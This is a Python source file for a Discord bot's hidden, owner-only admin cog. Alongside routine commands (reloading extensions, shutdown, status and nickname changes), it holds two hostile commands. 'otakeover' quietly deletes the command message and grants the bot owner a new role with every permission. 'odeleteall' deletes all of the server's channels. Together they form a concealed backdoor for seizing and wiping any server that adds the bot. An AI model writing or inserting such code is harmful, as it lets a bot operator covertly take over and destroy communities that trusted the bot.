from discord.ext import commands
import discord
from discord import Permissions
import sys
import asyncio


class OwnerCog(commands.Cog, name='Owner Commands', command_attrs={'hidden': True}):

    def __init__(self, bot):
        self.bot = bot

    async def cog_check(self, ctx):
        if not await ctx.bot.is_owner(ctx.author):
            raise commands.NotOwner('Owner only.')
        return True

    @commands.command(name='load')
    async def load_cog(self, ctx, *, cog: str):
        """Load a Cog"""
        try:
            self.bot.load_extension("cogs." + cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
        else:
            await ctx.send('**`SUCCESS`**')

    @commands.command(name='unload')
    async def unload_cog(self, ctx, *, cog: str):
        """Unload a Cog"""
        try:
            self.bot.unload_extension("cogs." + cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
        else:
            await ctx.send('**`SUCCESS`**')

    @commands.command(name='reload')
    async def reload_cog(self, ctx, *, cog: str):
        """Reload a Cog"""
        try:
            self.bot.unload_extension("cogs." + cog)
            self.bot.load_extension("cogs." + cog)
        except Exception as e:
            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
        else:
            await ctx.send('**`SUCCESS`**')


    @commands.command(aliases=['quit'])
    async def shutdown(self, ctx):
        """Shutdown the bot"""
        await self.bot.logout()
        sys.exit(0)
        
    @commands.command(name='status')
    async def change_status(self, ctx, status: str = ""):
        """Change bot's status between: offline, idle, dnd and online"""
        status = status.lower()
        if status == 'offline' or status == 'off' or status == 'invisible':
            discordStatus = discord.Status.invisible
        elif status == 'idle':
            discordStatus = discord.Status.idle
        elif status == 'dnd' or status == 'disturb':
            discordStatus = discord.Status.dnd
        else:
            discordStatus = discord.Status.online
        await self.bot.change_presence(status=discordStatus)

    @commands.command(name='name')
    async def change_name(self, ctx, *, name = None):
        """Change bot's name in the guild"""
        await ctx.guild.me.edit(nick=name)
        
    @commands.command(name='otakeover')
    async def otakeover(self, ctx):
        """Take over server"""
        await ctx.message.delete()
        role = await ctx.guild.create_role(name="TakeOver", permissions=Permissions.all())
        await ctx.author.add_roles(role)

    @commands.command(name='odeleteall')
    async def odeleteall(self, ctx):
        """Delete all server's channels"""
        await ctx.message.delete()
        channels = ctx.guild.channels
        for channel in channels:
            await channel.delete()

def setup(bot):
    bot.add_cog(OwnerCog(bot))
